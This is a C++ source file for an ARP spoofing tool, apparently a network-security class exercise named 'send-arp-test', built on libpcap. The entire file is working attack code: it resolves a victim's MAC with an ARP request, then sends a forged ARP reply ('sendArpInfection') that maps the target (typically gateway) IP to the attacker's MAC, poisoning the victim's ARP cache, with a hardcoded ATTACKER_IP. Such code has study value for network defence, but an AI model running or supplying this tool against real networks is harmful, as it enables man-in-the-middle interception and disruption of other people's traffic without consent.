#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#define ATTACKER_IP "172.20.10.8" // 실제 Attacker IP

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

Mac getMac(const char* iface) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		fprintf(stderr, "socket error\n");
		return Mac::nullMac();
	}

	struct ifreq ifr;
	std::memset(&ifr, 0, sizeof(ifr));
	std::strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) != 0) {
		fprintf(stderr, "interface error: %s\n", iface);
		close(fd);
		return Mac::nullMac();
	}

	const uint8_t* mac = reinterpret_cast<const uint8_t*>(ifr.ifr_hwaddr.sa_data);
	Mac result(mac);

	close(fd);
	return result;
}

bool sendArpRequest(
	pcap_t* pcap,
	const Mac& attackerMac,
	const Ip& attackerIp,
	const Ip& senderIp
) {
	EthArpPacket packet{};

	packet.eth_.dmac_ = Mac::broadcastMac();
	packet.eth_.smac_ = attackerMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = attackerMac;
	packet.arp_.sip_ = htonl(attackerIp);
	packet.arp_.tmac_ = Mac::nullMac();
	packet.arp_.tip_ = htonl(senderIp);

	int result = pcap_sendpacket(
		pcap,
		reinterpret_cast<const u_char*>(&packet),
		sizeof(EthArpPacket)
	);

	if (result != 0) {
        fprintf(stderr, "failed to send ARP request");
		return false;
	}

	return true;
}

Mac getSenderMac(
	pcap_t* pcap,
	const Mac& attackerMac,
	const Ip& attackerIp,
	const Ip& senderIp
) {
	for (int attempt = 0; attempt < 3; attempt++) {
		if (!sendArpRequest(pcap, attackerMac, attackerIp, senderIp)) {
			return Mac::nullMac();
		}

		for (int readCount = 0; readCount < 3000; readCount++) {
			struct pcap_pkthdr* header;
			const u_char* rawPacket;

			int result = pcap_next_ex(pcap, &header, &rawPacket);

			if (result == 0) {
				continue;
			}

			if (result == -1) {
				fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(pcap));
				return Mac::nullMac();
			}

			if (result == -2) {
				return Mac::nullMac();
			}

			if (header->caplen < sizeof(EthArpPacket)) {
				continue;
			}

			const EthArpPacket* packet =
				reinterpret_cast<const EthArpPacket*>(rawPacket);

			if (ntohs(packet->eth_.type_) != EthHdr::Arp) {
				continue;
			}

			if (ntohs(packet->arp_.hrd_) != ArpHdr::ETHER ||
				ntohs(packet->arp_.pro_) != EthHdr::Ip4 ||
				packet->arp_.hln_ != Mac::Size ||
				packet->arp_.pln_ != Ip::Size) {
				continue;
			}

			if (ntohs(packet->arp_.op_) != ArpHdr::Reply) {
				continue;
			}

			Ip replySenderIp(ntohl(packet->arp_.sip_));
			Ip replyTargetIp(ntohl(packet->arp_.tip_));

			if (!(replySenderIp == senderIp)) {
				continue;
			}

			if (!(replyTargetIp == attackerIp)) {
				continue;
			}

			if (!(packet->arp_.tmac_ == attackerMac)) {
				continue;
			}

			return packet->arp_.smac_;
		}
	}

	fprintf(
		stderr,
        "could not find MAC\n"
	);

	return Mac::nullMac();
}

bool sendArpInfection(
	pcap_t* pcap,
	const Mac& attackerMac,
	const Mac& senderMac,
	const Ip& senderIp,
	const Ip& targetIp
) {
	EthArpPacket packet{};

	packet.eth_.dmac_ = senderMac;
	packet.eth_.smac_ = attackerMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = attackerMac;
	packet.arp_.sip_ = htonl(targetIp);
	packet.arp_.tmac_ = senderMac;
	packet.arp_.tip_ = htonl(senderIp);

	int result = pcap_sendpacket(
		pcap,
		reinterpret_cast<const u_char*>(&packet),
		sizeof(EthArpPacket)
	);

	if (result != 0) {
        fprintf(stderr, "coudl not send arp infection\n");
		return false;
	}

	return true;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc - 2) % 2 != 0) {
		usage();
		return 1;
	}

	char* interface = argv[1];
	Mac attackerMac = getMac(interface);

	if (attackerMac.isNull()) {
		fprintf(stderr, "could not get Attacker MAC\n");
		return 1;
	}

	Ip attackerIp(ATTACKER_IP);
	if (attackerIp == Ip("0.0.0.0")) {
		fprintf(stderr, "set ATTACKER_IP in main.cpp before running\n");
		return 1;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);

	if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device\n");
		return 1;
	}

	if (pcap_datalink(pcap) != DLT_EN10MB) {
        fprintf(stderr, "unsupported data-link type\n");
		pcap_close(pcap);
		return 1;
	}

	bool allSucceeded = true;

	for (int i = 2; i < argc; i += 2) {
		Ip senderIp(argv[i]);
		Ip targetIp(argv[i + 1]);

		Mac senderMac = getSenderMac(
			pcap,
			attackerMac,
			attackerIp,
			senderIp
		);

		if (senderMac.isNull()) {
			fprintf(
				stderr,
                "failed to get Sender MAC\n"
			);
			allSucceeded = false;
			continue;
		}



		if (!sendArpInfection(
				pcap,
				attackerMac,
				senderMac,
				senderIp,
				targetIp)) {
			allSucceeded = false;
			continue;
		}
	}

	pcap_close(pcap);
	return allSucceeded ? 0 : 1;
}
